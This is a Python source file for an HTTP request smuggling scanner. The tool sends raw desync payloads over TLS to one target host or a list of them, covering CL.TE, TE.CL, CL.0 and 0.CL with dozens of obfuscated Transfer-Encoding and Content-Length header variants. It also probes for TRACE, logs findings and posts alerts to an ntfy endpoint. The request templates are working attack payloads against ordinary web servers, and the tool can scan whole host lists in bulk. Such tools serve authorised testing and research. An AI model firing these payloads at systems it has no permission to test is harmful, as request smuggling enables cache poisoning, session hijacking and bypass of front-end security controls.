import requests
import argparse
import socket
import ssl
import time
import os
from tqdm import tqdm
import signal
import contextlib
import re
from requests.auth import HTTPBasicAuth
from dotenv import load_dotenv

load_dotenv()  

NTFY_ENDPOINT = os.getenv("NTFY_ENDPOINT", "https://localhost/NOTIFICATIONS")
NTFY_USER = os.getenv("NTFY_USER")
NTFY_PASS = os.getenv("NTFY_PASS")

BLUE, RED, GREEN, RESET = '\033[94m', '\033[91m', '\033[92m', '\033[0m'
DEFAULT_METHOD = "POST"
DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"

TE_HEADERS_VARIATIONS = [
        "Transfer-Encoding: chunked\r\n",
        "Transfer-Encoding : chunked\r\n",
        "Transfer-Encoding: chunked \r\n",
        "Transfer-Encoding: xchunked\r\n",
        "Transfer-Encoding: \tchunked\r\n",
        " Transfer-Encoding: chunked\r\n",
        "X: X\nTransfer-Encoding: chunked\r\n",
        "Transfer-Encoding: chunked\nX: X\r\n",
        "Transfer-Encoding: chunked\nX: X\n",
        "Transfer-Encoding: chunked\nX: X\n\n",
        "Transfer-Encoding: \nchunked\r\n",
        "Transfer-Encoding\n: chunked\r\n",
        "transfer-encoding: chunked\r\n",
        "TRANSFER-ENCODING: chunked\r\n",
        "TrAnSfEr-ENCodIng: chunked\r\n",
        "tRanSfeR-encoDinG: chunked\r\n",
        "TRANSFER-encoding: chunked\r\n",
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: cooked\r\n",
    ]

CL_HEADERS_VARIATIONS = [
        "Content-Length: 30\r\n",
        "Content-Length : 30\r\n",
        "Content-Length: 30\r\n"
        "Content-Length: 0\r\n",
        "Content-Length: 0\r\n"
        "Content-Length: 30\r\n",
        "Content-Length: 30\r\n"
        "Content-Length: 30\r\n",
        "Content-Length: \t30\r\n",
        " Content-Length: 30\r\n",
        "X: X\nContent-Length: 30\r\n",
        "Content-Length: 30\nX: X\r\n",
        "Content-Length\n: 30\r\n",
        "Content-Length:\n 30\r\n",
        "cOnTeNt-LeNgTh: 30\r\n",
        "CONTENT-LENGTH: 30\r\n",
    ]
    


# check if TRACE is enabled on target host (almost unrelated but very interesting if enabled)
def trace(host, user_agent):
    headers = {"User-Agent": f"{user_agent}", "X_test": "test"}
    r = requests.request("TRACE", f"https://{host}", headers=headers)
    r2 = requests.get(f"https://{host}", headers=headers)
    if r.status_code == 200 and r2.text != r.text and "X_test" in r.text:
        print_ntfy_and_save_to_file(f"{RED}[!]{RESET} TRACE is enabled on the host {host}")
        print_ntfy_and_save_to_file(f"{RED}[!]{RESET} TRACE response: \n"+r.text)
    else:
        print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} TRACE is disabled on the host -", r.status_code)
    r3 = requests.request("FOO", f"https://{host}", headers=headers)
    if r3.text == r2.text:
        print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Be careful, the host treats unknown methods as GET")

# Sanity check to see if host is up and behaving normally
def sanity_check(host):
    global sanity_check_retries
    max_retries = 10
    while sanity_check_retries < max_retries:
        try:
            r = requests.get("https://" + host, timeout=1)
            if r.status_code in range(200, 299):
                print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Sanity check: Host is up and behaving normally - {r.status_code}")
                return True
            elif r.status_code == 404:
                print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Sanity check: Host is unreachable or not found - 404")
                return False
            else:
                print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Sanity check: Host is weird")
                print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Status code: ", r.status_code)
                return False
        except requests.exceptions.ConnectionError:
            print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Sanity check: Host is down")
            return False
        except requests.exceptions.ReadTimeout:
            print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Sanity check: Host is slow or timing out")
            sanity_check_retries += 1
            return sanity_check(host)
    print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Sanity check: Host is down")
    sanity_check_retries = 0
    return False

# Send the request and return True if we get a 404 on the second request (normal one)
# used in detect_clte_tecl
def send_and_return_true_if_404(host, request):
    try:
        wrapped_socket = prepare_socket(host)
        wrapped_socket.send(request.encode())
        wrapped_socket.close()
        response_2 = requests.get(f"https://{host}", timeout=1)
        if response_2.status_code == 404:
            return True
        else:
            return False
    except requests.exceptions.ReadTimeout:
        return False
    except TimeoutError:
        return False

# Detect CL.TE vulnerabilities (no probs, directly 404 detection method)
def detect_clte(host, user_agent):
    print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Detection of CL.TE")
    base_request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 35\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /404 HTTP/1.1\r\n"
        "X-Ignore: X"
    )
    for te_header in TE_HEADERS_VARIATIONS:
        if not sanity_check(host):
            return
        print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Testing CL.TE with header : {repr(te_header)}")
        request = base_request.replace("Transfer-Encoding: chunked\r\n", te_header)
        if send_and_return_true_if_404(host, request):
            print_ntfy_and_save_to_file(f"{RED}[!]{RESET} Host {host} is vulnerable to this CL.TE attack payload :")
            print_attack_with_n_r(request)

# Detect TE.CL vulnerabilities (no probs, directly 404 detection method)
def detect_tecl(host, user_agent):
    print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Detection of TE.CL")
    base_request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5e\r\n"
        f"{method} /404 HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1\r\n"
        "0\r\n"
        "\r\n"
    )
    for te_header in TE_HEADERS_VARIATIONS:
        if not sanity_check(host):
            return
        print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Testing TE.CL with header : {repr(te_header)}")
        request = base_request.replace("Transfer-Encoding: chunked\r\n", te_header)
        if send_and_return_true_if_404(host, request):
            print_ntfy_and_save_to_file(f"{RED}[!]{RESET} Host {host} is vulnerable to this TE.CL attack payload :")
            print_attack_with_n_r(request)
   

# Detect CL0 vulnerabilities
def detect_cl0(host, user_agent, endpoint):
    print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Detection of CL0")
    base_request = (
        f"{method} /"+endpoint+" HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 30\r\n"
        "\r\n"
        "GET /404 HTTP/1.1\r\n"
        "X-Ignore: X"
    )
    for cl_header in CL_HEADERS_VARIATIONS:
        if not sanity_check(host):
            return
        print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Testing CL0 with header : {repr(cl_header)}")
        request = base_request.replace("Content-Length: 30\r\n", cl_header)
        if send_and_return_true_if_404(host, request):
            print_ntfy_and_save_to_file(f"{RED}[!]{RESET} Host {host} is vulnerable to this CL0 attack payload :")
            print_attack_with_n_r(request)

# Detect 0CL vulnerabilities
def _0CL_detection(host, user_agent, endpoint):
    print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Detection of 0CL")
    base_first_request = (
            f"{method} /"+endpoint+" HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {user_agent}\r\n"
            "Content-Length: 20\r\n"
            "\r\n"
    )
    second_request = (
            "GET / HTTP/1.1\r\n"
            "X: yGET /404 HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "\r\n"
    )
    # TODO : BEFORE SENDING THE FIRST REQUEST, CHECK IF USING THE CL HEADER DOES NOT CAUSE A TIMEOUT -> IF IT DOES, THE FRONT END IS PROCESSING THE HEADER AND IT'S NOT A 0CL VULN -> SKIP TO NEXT VARIATION
    for cl_header in CL_HEADERS_VARIATIONS:
        if not sanity_check(host):
            return
        print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Testing 0CL with header : {repr(cl_header)}")
        first_request = base_first_request.replace("Content-Length: 20\r\n", cl_header)
        first_request = first_request.replace("30", "20")
        # print_attack_with_n_r(first_request)
        # print_attack_with_n_r(second_request)
        # Send first request
        wrapped_socket = prepare_socket(host)
        wrapped_socket.sendall(first_request.encode())
        wrapped_socket.close()
        # Send second request
        wrapped_socket = prepare_socket(host)
        wrapped_socket.sendall(second_request.encode())
        second_response = b""
        while True:
            try:
                data = wrapped_socket.recv(4096)
                second_response += data
                if not data or data.endswith(b"\r\n\r\n"):
                    break
            except TimeoutError:
                break
        wrapped_socket.close()
        # Analyze response of second request : is it a 404 ?
        second_response = extract_response(second_response)
        if "404" in second_response[:13]:
            print_ntfy_and_save_to_file(f"{RED}[!]{RESET} {host} is vulnerable to this 0CL payload :")
            print_attack_with_n_r(first_request)
            print_attack_with_n_r(second_request)


# ---------------
# --- HELPERS ---
# ---------------

# Clean host string from URL to just hostname (used in main)
def clean_host_str(host):
    host = host.replace("https://", "").replace("http://", "")
    if host[-1:] == "/":
        host = host[:-1]
    return host

# Split host and endpoint if needed (used in main)
def host_or_endpoint(host):
    host = clean_host_str(host)
    if "/" in host:
        host, endpoint = host.split("/", 1)
        return host, endpoint
    else:
        return host, ""

# print banner
def print_banner():
    banner = r"""
  ██████  ███▄ ▄███▓ █    ██   ▄████   ▄████  ██▓    ▓█████  ██▀███  
▒██    ▒ ▓██▒▀█▀ ██▒ ██  ▓██▒ ██▒ ▀█▒ ██▒ ▀█▒▓██▒    ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▓██    ▓██░▓██  ▒██░▒██░▄▄▄░▒██░▄▄▄░▒██░    ▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒██    ▒██ ▓▓█  ░██░░▓█  ██▓░▓█  ██▓▒██░    ▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒▒██▒   ░██▒▒▒█████▓ ░▒▓███▀▒░▒▓███▀▒░██████▒░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░▒▓▒ ▒ ▒  ░▒   ▒  ░▒   ▒ ░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░░  ░      ░░░▒░ ░ ░   ░   ░   ░   ░ ░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░      ░    ░░░ ░ ░ ░ ░   ░ ░ ░   ░   ░ ░      ░     ░░   ░ 
      ░         ░      ░           ░       ░     ░  ░   ░  ░   ░     
"""
    print(banner)

# Helper to remove ANSI codes (for logs)
def remove_ansi(text):
    ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', text)

# extract the first line of the response (status line)
def extract_response(response):
    try:
        response = response.decode()
    except UnicodeDecodeError:
        response = response.decode("ISO-8859-1")
    return response.split("\r\n")[0]

# Print the attack payload with explicit \r\n for copy/paste in burpsuite or similar
def print_attack_with_n_r(attack):
    sanity_check_retries = 0 
    print_ntfy_and_save_to_file(f"{RED}[!]{RESET} Here is the request:","\n"+repr(attack).replace("\\n", "\\n\n").strip("'"))


# time limit to avoid weird behavior on some hosts
# --- Timer Unix (main thread only) ---
@contextlib.contextmanager
def time_limit(seconds: int):
    def _timeout_handler(signum, frame):
        raise TimeoutError("Host processing timed out")
    old_handler = signal.signal(signal.SIGALRM, _timeout_handler)
    signal.alarm(seconds)
    try:
        yield
    finally:
        signal.alarm(0)
        signal.signal(signal.SIGALRM, old_handler)

# Prepare a raw socket 
def prepare_socket(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    wrapped_socket = context.wrap_socket(s, server_hostname=host)
    wrapped_socket.connect((host, 443))
    wrapped_socket.settimeout(1)
    return wrapped_socket

# Send a notification to ntfy via POST JSON with Basic Auth
def ntfy_me(message: str, title: str, timeout: int = 5) -> bool:
    """
    Envoie une notification à ntfy via POST JSON avec Basic Auth.
    Retourne True si succès, False sinon.
    """
    if not NTFY_USER or not NTFY_PASS:
        # print("NTFY_USER / NTFY_PASS non définis dans .env — notification non envoyée.")
        return False

    try:
        resp = requests.post(
            NTFY_ENDPOINT,
            json={"title": title, "message": message},
            auth=HTTPBasicAuth(NTFY_USER, NTFY_PASS),
            timeout=timeout,
        )
        resp.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        print(f"Failed to send notification: {e}")
        return False

# print, save to file and notify if needed
# if verbose, print/save everything, else only print/save lines with [!] or [>]
def print_ntfy_and_save_to_file(*args):
    date = time.strftime("%Y-%m-%d", time.localtime())
    if not os.path.exists("logs"):
        os.mkdir("logs")
    raw_text = ' '.join([remove_ansi(str(arg)) for arg in args])
    colored_text = ' '.join([str(arg) for arg in args])
    if "[!]" in colored_text:
        ntfy_me(colored_text, title="Vuln detected :")
    if verbose:
        print(colored_text)
        with open(f"logs/smuggler2000_{date}.log", "a") as f:
            f.write(raw_text + "\n")
    else:
        if args and isinstance(args[0], str) and ("[!]" in args[0] or "[>]" in args[0]):
            print(colored_text)
            with open(f"logs/smuggler2000_{date}.log", "a") as f:
                f.write(raw_text + "\n")

def parse_args():
    parser = argparse.ArgumentParser(
        description="SMUGGLER - HTTP Request Smuggling tool\nAuthor: gobelinor"
    )
    parser.add_argument("-u", "--url", dest="url", help="Host to test")
    parser.add_argument("--clte", help="Detect CL.TE", action="store_true")
    parser.add_argument("--tecl", help="Detect TE.CL", action="store_true")
    parser.add_argument("--CL0", help="Detect CL0", action="store_true")
    parser.add_argument("--_0CL", help="Detect _0CL vulnerability", action="store_true")
    parser.add_argument("--all", help="Detect all vulnerabilities", action="store_true")
    parser.add_argument("-l","--list", help="List txt file of hosts to test")
    parser.add_argument("-A", "--user-agent", default=DEFAULT_UA, help="User-Agent to use")
    parser.add_argument("-method", default=DEFAULT_METHOD, help="HTTP method to use")
    parser.add_argument("-verbose", help="Verbose mode", action="store_true")
    parser.add_argument("--double_desync", action="store_true",
                        help="Probe 0.CL -> CL.0 (safe) and find robust FE-injection offset")
    return parser.parse_args()

# ---------------
# ---- MAIN -----
# ---------------

if __name__ == "__main__":
    print_banner()
    args = parse_args()

    verbose = args.verbose
    method = args.method.upper()
    user_agent = args.user_agent
    sanity_check_retries = 0
    if not args.clte and not args.tecl and not args._0CL and not args.CL0 and not args.all:
        print_ntfy_and_save_to_file(f"{GREEN}[>]{RESET} You can use --all, --clte, --tecl, --CL0 and/or --_0CL to test for vulnerabilities")
        exit(1)
    if args.url:
        url = args.url
        host, endpoint = host_or_endpoint(url)
        print_ntfy_and_save_to_file(f"\n{GREEN}[>]{RESET} Testing host: ", f"{BLUE}{host}{RESET}")
        print_ntfy_and_save_to_file(f"{GREEN}[>]{RESET} Testing method: ", f"{BLUE}{method}{RESET}")
        print_ntfy_and_save_to_file(f"{GREEN}[>]{RESET} Testing endpoint: {BLUE}/{endpoint}{RESET}")
        try:
            if not sanity_check(host):
                exit(1)
            trace(host, user_agent)
            if args.clte:
                detect_clte(host, user_agent)
            if args.tecl:
                detect_tecl(host, user_agent)
            if args.CL0:
                detect_cl0(host, user_agent, endpoint)
            if args._0CL:
                _0CL_detection(host, user_agent, endpoint)
            if args.all:
                detect_clte(host, user_agent)
                detect_tecl(host, user_agent)
                detect_cl0(host, user_agent, endpoint)
                _0CL_detection(host, user_agent)

            # if args.double_desync:
            #     run_double_desync_probe(host, user_agent)
            # if args._0CL:
            #     _0CL_detection(host, user_agent)
            #detect_advanced_HTTPRS(host, user_agent)
            #CL0_variations(host, endpoint, user_agent)
        except KeyboardInterrupt:
            print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Exiting...")
            exit(1)
        except Exception as e:
            print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Error: ", e)
            exit(1)
    if args.list:
        with open(args.list) as f:
            hosts = [h.strip() for h in f if h.strip()]
        TIMEOUT_SECS = 5 * 60  # 5 minutes
        for host in tqdm(hosts, desc="🔍 Scanning Hosts", unit="host"):
            try:
                with time_limit(TIMEOUT_SECS):
                    host, endpoint = host_or_endpoint(host)
                    print_ntfy_and_save_to_file(f"\n{GREEN}[>]{RESET} Testing host: ", f"{BLUE}{host}{RESET}")
                    print_ntfy_and_save_to_file(f"{GREEN}[>]{RESET} Testing method: ", f"{BLUE}{method}{RESET}")
                    print_ntfy_and_save_to_file(f"{GREEN}[>]{RESET} Testing endpoint: {BLUE}/{endpoint}{RESET}")
                    if not sanity_check(host):
                        continue
                    trace(host, user_agent)
                    if args.clte:
                        detect_clte(host, user_agent)
                    if args.tecl:
                        detect_tecl(host, user_agent)
                    # if args._0CL:
                        # _0CL_detection(host, user_agent)
                    # detect_advanced_HTTPRS(host, user_agent)
                    # CL0_variations(host, endpoint, user_agent)
            except TimeoutError:
                print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Timeout: {host}")
                continue
            except Exception as e:
                print_ntfy_and_save_to_file(f"{GREEN}[+]{RESET} Error: ", e)
                continue
    if not args.url and not args.list:
        print_ntfy_and_save_to_file(f"{GREEN}[>]{RESET} Please provide a host or a list of hosts to test")
        exit(1)
    print_ntfy_and_save_to_file(f"\n{GREEN}[>]{RESET} Done\n")

